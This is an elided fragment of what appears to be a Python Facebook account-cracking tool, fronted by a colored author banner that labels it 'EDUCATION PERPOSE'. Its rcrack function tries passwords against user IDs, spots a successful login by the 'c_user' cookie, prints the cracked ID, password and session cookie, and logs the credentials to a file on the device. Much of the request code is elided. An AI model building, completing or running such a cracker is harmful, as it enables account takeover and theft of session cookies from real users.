...
\033[1;94m██   ██ ██   ██ ██   ██ ██ ██████                                                                                                                                                                                                                                                                                                                                                                                          
\33[1;91m╔════════════════════════════════════════╗
\33[1;94m║[•] Author    : RAKIB HASAN                   ║
\33[1;92m║[•] Facebook  : R A K I B               ║
\33[1;90m║[•] Whatsapp  : +***********            ║
\33[1;95m║[•] Github    : Mr-Rakib-404         ║
\33[1;92m║[•] Status    : TRIAL                   ║
\33[1;96m║[•] Network   : 3G, 4G/5G, ON           ║
\33[1;92m║[•] Version   : 1.0.7                   ║
\33[1;93m║[•] Tools     : EDUCATION PERPOSE            ║
\33[1;91m╚════════════════════════════════════════╝"""
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAKIB-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
